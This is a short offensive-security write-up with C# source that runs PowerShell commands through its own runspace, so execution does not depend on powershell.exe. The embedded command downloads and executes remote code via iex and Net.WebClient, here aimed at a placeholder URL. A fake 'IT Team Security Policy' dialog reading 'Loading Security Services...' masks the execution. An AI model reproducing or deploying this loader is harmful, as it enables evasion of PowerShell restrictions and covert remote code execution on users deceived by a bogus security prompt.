### Powershell Attack Without Powershell.exe
The Powershell.exe is just interpret of .NET assembly System.Management.Automation.dll to execute OS Command and invoke PowerShell commands.
System.Management.Automation.dll file is loaded when powershell.exe open up. hence I do not rely on powershell.exe to execute OS command and Invoke powershell command, 
because We can write our own interpreter to execucate any OS Command without having powershell.exe.


```
using System;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Windows.Forms;

public class Program
{
    public static void Main()
    {

        Execution.MeMe();
        MessageBox.Show("Loading Security Services...", "IT Team Security Policy", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
    }
    public class Execution
    {
        public static void MeMe()
        {
            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
            Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
            rspace.Open();
            Pipeline pipeline = rspace.CreatePipeline();
            pipeline.Commands.AddScript("iex ((New-Object Net.WebClient).DownloadString('https://www.google.com/robots.txt'))");
            pipeline.Invoke();
        }
    }
}

```

